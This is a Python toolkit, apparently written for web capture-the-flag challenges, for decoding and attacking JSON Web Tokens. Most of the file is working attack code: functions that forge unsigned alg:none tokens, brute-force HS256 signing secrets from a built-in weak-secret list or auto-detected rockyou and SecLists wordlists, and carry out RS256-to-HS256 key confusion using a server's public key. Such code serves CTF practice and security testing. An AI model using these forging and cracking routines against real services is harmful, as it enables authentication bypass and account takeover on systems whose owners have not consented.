"""
JWT (JSON Web Token) Analysis and Exploit Toolkit for Web CTF challenges.
Supports decode, alg:none bypass, signature brute-force, and RS256 -> HS256 key confusion.
"""

import json
import base64
import hmac
import hashlib
import os
import time
from typing import Dict, Any, Optional, Tuple, List

DEFAULT_SECRET_WORDLIST = [
    "secret", "jwt", "password", "123456", "admin", "root", "key", "supersecret",
    "12345678", "qwerty", "test", "master", "iloveyou", "welcome", "flag",
    "ctf", "secretkey", "jwtsecret", "token", "auth", "api_secret", "private", "ilovepico", "picoctf"
]

# Linux/Kali standard wordlist paths (auto-detected)
LINUX_WORDLIST_PATHS = [
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/wordlists/fasttrack.txt",
    "/usr/share/wordlists/nmap.lst",
    "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
    "/usr/share/seclists/Passwords/Common-Credentials/best1050.txt",
    "/usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt",
    "/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt",
    "/usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt",
    "/usr/share/dirb/wordlists/common.txt",
]

def load_wordlist(path: Optional[str] = None) -> List[str]:
    """Load a wordlist from a file path. If path is None, auto-detect from Linux standard paths."""
    if path and os.path.isfile(path):
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                return [line.strip() for line in f if line.strip()]
        except Exception:
            pass
    # Auto-detect from standard Linux paths
    for candidate in LINUX_WORDLIST_PATHS:
        if os.path.isfile(candidate):
            try:
                with open(candidate, "r", encoding="utf-8", errors="ignore") as f:
                    words = [line.strip() for line in f if line.strip()]
                if words:
                    return words
            except Exception:
                continue
    return DEFAULT_SECRET_WORDLIST

def base64url_decode(input_str: str) -> bytes:
    """Decode base64url string with padding fix."""
    rem = len(input_str) % 4
    if rem > 0:
        input_str += "=" * (4 - rem)
    return base64.urlsafe_b64decode(input_str)

def base64url_encode(data: bytes) -> str:
    """Encode bytes to base64url string without padding."""
    return base64.urlsafe_b64encode(data).decode("utf-8").rstrip("=")

def decode_jwt(token: str) -> Dict[str, Any]:
    """Parse and inspect JWT header, payload, and signature."""
    parts = token.strip().split(".")
    if len(parts) < 2:
        return {"error": "Invalid JWT format. Expected at least 2 dot-separated parts."}
    
    header_raw = parts[0]
    payload_raw = parts[1]
    sig_raw = parts[2] if len(parts) > 2 else ""

    try:
        header = json.loads(base64url_decode(header_raw).decode("utf-8", errors="ignore"))
    except Exception as e:
        header = {"raw": header_raw, "error": str(e)}

    try:
        payload = json.loads(base64url_decode(payload_raw).decode("utf-8", errors="ignore"))
    except Exception as e:
        payload = {"raw": payload_raw, "error": str(e)}

    return {
        "header": header,
        "payload": payload,
        "signature": sig_raw,
        "num_parts": len(parts)
    }

def forge_alg_none(payload_dict: Dict[str, Any], alg_variant: str = "none") -> str:
    """Forge JWT with alg:none (or None / NONE) and strip signature."""
    header = {"alg": alg_variant, "typ": "JWT"}
    header_b64 = base64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    payload_b64 = base64url_encode(json.dumps(payload_dict, separators=(",", ":")).encode("utf-8"))
    return f"{header_b64}.{payload_b64}."

def sign_jwt_hs256(header_dict: Dict[str, Any], payload_dict: Dict[str, Any], secret: str) -> str:
    """Sign custom JWT using HS256 and a secret key."""
    header_dict["alg"] = "HS256"
    header_b64 = base64url_encode(json.dumps(header_dict, separators=(",", ":")).encode("utf-8"))
    payload_b64 = base64url_encode(json.dumps(payload_dict, separators=(",", ":")).encode("utf-8"))
    
    msg = f"{header_b64}.{payload_b64}".encode("utf-8")
    sig = hmac.new(secret.encode("utf-8"), msg, hashlib.sha256).digest()
    sig_b64 = base64url_encode(sig)
    
    return f"{header_b64}.{payload_b64}.{sig_b64}"

def bruteforce_secret(token: str, wordlist: Optional[List[str]] = None) -> Optional[str]:
    """Attempt dictionary attack to crack HS256 secret key.
    Uses provided wordlist, or auto-loads from Linux standard paths (rockyou.txt, SecLists, etc.)."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    
    header_b64, payload_b64, signature_b64 = parts
    msg = f"{header_b64}.{payload_b64}".encode("utf-8")
    expected_sig = base64url_decode(signature_b64)
    
    words = wordlist if wordlist is not None else load_wordlist()
    
    for secret in words:
        secret_clean = secret.strip()
        if not secret_clean:
            continue
        sig = hmac.new(secret_clean.encode("utf-8"), msg, hashlib.sha256).digest()
        if hmac.compare_digest(sig, expected_sig):
            return secret_clean
            
    return None

def key_confusion_rs256_to_hs256(payload_dict: Dict[str, Any], public_key_pem: str) -> str:
    """
    Execute RS256 to HS256 Key Confusion attack:
    Signs token using HS256 with the server's public key as the HMAC secret.
    """
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = base64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    payload_b64 = base64url_encode(json.dumps(payload_dict, separators=(",", ":")).encode("utf-8"))
    
    msg = f"{header_b64}.{payload_b64}".encode("utf-8")
    sig = hmac.new(public_key_pem.encode("utf-8"), msg, hashlib.sha256).digest()
    sig_b64 = base64url_encode(sig)
    
    return f"{header_b64}.{payload_b64}.{sig_b64}"
